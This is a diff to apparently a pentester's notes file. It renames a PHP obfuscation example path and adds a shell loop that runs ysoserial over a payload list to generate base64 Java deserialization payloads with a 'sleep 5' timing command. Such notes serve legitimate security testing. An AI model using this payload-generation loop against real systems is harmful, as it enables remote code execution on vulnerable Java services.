@@ -126,7 +126,7 @@ https://hackvertor.co.uk/public
 
 ### PHP Obfuscation - base64+gzdeflate
 
-/codes/obufscation.php
+/codes/obufscation/obfuscation.php
 
 ### Response - Status code WAF'S
 
@@ -432,7 +432,18 @@ https://github.com/frohoff/ysoserial
 https://github.com/NickstaDB/SerializationDumper
 
 https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java
-
+  
+### Script
+  
+/code/deserialization/java/gserial.sh
+  
+codes/deserialization/java/payload.txt
+  
+while read payload; 
+do echo "$payload\n\n"; 
+java -jar ysoserial.jar $payload "sleep 5" | base64 | tr -d '\n' > $payload.ser; 
+echo "-----------------Loading-----------------\n\n"; done < payloads.txt
+                                                                         
 #### Bad Sign
 
 -> ClassNot FoundException
